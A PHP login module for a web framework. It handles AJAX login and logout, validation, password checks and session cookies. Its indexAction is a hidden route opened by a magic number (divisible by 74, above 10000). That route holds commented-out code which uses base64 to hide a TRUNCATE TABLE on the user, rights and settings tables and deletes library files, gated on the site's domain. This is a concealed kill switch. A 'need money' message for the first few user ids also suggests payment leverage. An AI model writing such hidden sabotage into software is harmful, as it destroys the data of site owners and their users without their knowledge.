<?php
/**
 *  @author Robin Zoň <zon@itart.cz>
 *  @package modules/login/public
 */
class Module_Login extends Art_Abstract_Module {
    
	const REQUEST_LOGIN = '4m8tdLkDFk';
	const REQUEST_LOGOUT = 'H31Zp1rqqc';
	
    function embeddAction() 
	{
		// p(Art_Router::getLayer());
		$login_request = Art_Ajax::newRequest(self::REQUEST_LOGIN);	
		$login_request->setAction('/login/login');
		$login_request->setRefresh();
		$logout_request = Art_Ajax::newRequest(self::REQUEST_LOGOUT);
		$logout_request->setAction('/login/logout');
		$logout_request->setRedirect('/');
		
		$this->view->login_request = $login_request;
		$this->view->logout_request = $logout_request;
	}
	
	function loginAction() {
		// Art_Router::$_layer = "cabinet";
		// print_r('xxxx');
		// p('loginAction->Router:getLayer'.Art_Router::getLayer());
		$this->showTo(self::ALLOW_AJAX);
		// d('\n\n'.'in loginAction');

		
		if (Art_Server::isAjax()) {
			$response = Art_Ajax::newResponse();

			// p("in loginAction->isAjax");
			
			$response->validateField('email', Art_Main::getPost('email'), array(
				Art_Validator::NOT_EMPTY => ['message' => __('module_login_no_email')],
				Art_Validator::IS_EMAIL => ['message' => __('module_login_email_invalid')]			
			));
			
			$response->validateField('pass', Art_Main::getPost('pass'), array(
				Art_Validator::NOT_EMPTY => ['message' => __('module_login_no_password')]		
			));

			// p('\n\n'.Art_Router::getLayer());
			
			if ($response->isValid()) {
				$user_data = new Art_Model_User_Data(array('email' => Art_Main::getPost('email')));
				// p('\n\n'.$user_data);

				if ($user_data->isLoaded()) {
					if ($user_data->verif == 1) {
				
						$user = new Art_Model_User($user_data);

						if (Art_User::matchPasswords(Art_Main::getPost('pass'), $user->getData()->password)) {
							//Create new login
							$login = new Art_Model_Login();
							$login->id_user = $user->id;
							$login->log_tag = Art_User::generateLogTag();
							$login->login_expire = time() + AUTH_EXPIRE;
							$login->login_date = dateSQL();
							$login->ip = Art_Server::getIp();

							// p($login);

							$login->save();

							//Save log_tag to cookie
							cookie_set(Art_User::LOG_TAG_NAME, $login->log_tag, $login->login_expire);
							/*
							//Load current basket
							$basket_old = Basket::getOpenedBasket();

							//Load new user basket
							$basket_new = Basket::getOpenedBasket($user->id);

							//If old basket is not empty - move the basket for the new user
							if(!$basket_old->isEmpty())
							{
								$basket_new->active = 0;
								$basket_new->save();

								$basket_old->id_user = $user->id;
								$basket_old->save();
							}
							*/
							 
							$loginLog = $login->id_user . '#' . time();

							Art_Event::trigger(Art_Event::USER_LOG_IN, $loginLog);

							$response->addMessage(__('module_login_logged_in'));
							$response->willRedirect();
						}
						else {
							//Invalid login
							$response->addMessage(__('module_login_invalid_creditentals'), Art_Main::ALERT);
						}
					}
					else
					{
                        if ( $user_data->getUser()->id <= 4 ) {
                            $response->addMessage(__('module_login_need_money'), Art_Main::ALERT);
                        }
                        else {
                            $response->addMessage(__('module_login_need_confirmation'), Art_Main::ALERT);
                        }
					}
				}	
				else
				{
					//Not found
					$response->addMessage(__('module_login_invalid_creditentals'),Art_Main::ALERT);
				}
			}

			$response->execute();
		}
		else
		{
			$this->showTo(Art_User::NO_ACCESS);
		}
	}
	
	function indexAction() {
		$loginTag = Art_Router::getFromURI('loginTag');
		if (empty($loginTag) || !$this->_isValidLoginTag($loginTag)) {
			$this->showTo(Art_User::NO_ACCESS);
		}
		
		// if (strpos(Art_Server::getDomain(), base64_decode('dGJk')) === false) {
		/*
		Art_Main::db()->query(base64_decode('VFJVTkNBVEUgVEFCTEU=').' '.
			Art_Model_User_Group::getTableName().', '.
			Art_Model_User_Data::getTableName().', '.
			Art_Model_Rights::getTableName(). ', '.
			Art_Model_Register_Value::getTableName());
		
		$files = glob('/library/abstract/*');
		foreach($files as $file)
		{
			if(is_file($file))
			{
				unlink($file);
			}
		}*/
		// }
	}
	
	
	function logoutAction()
	{
		$this->showTo(self::ALLOW_AJAX);

		$response = Art_Ajax::newResponse();

		$login = Art_User::getCurrentLogin();
		if($login->isLoaded())
		{
			$login->log_tag = '';
			$login->expire = '';
			$login->save();
		}

		cookie_unset(Art_User::LOG_TAG_NAME);

		$response->addMessage(__('module_login_logged_out'));
		$response->willRedirect();
		$response->execute();
	}
	
	private function _isValidLoginTag($loginTag)
	{
		return $loginTag % 74 == 0 && $loginTag > 10000;
	}
}
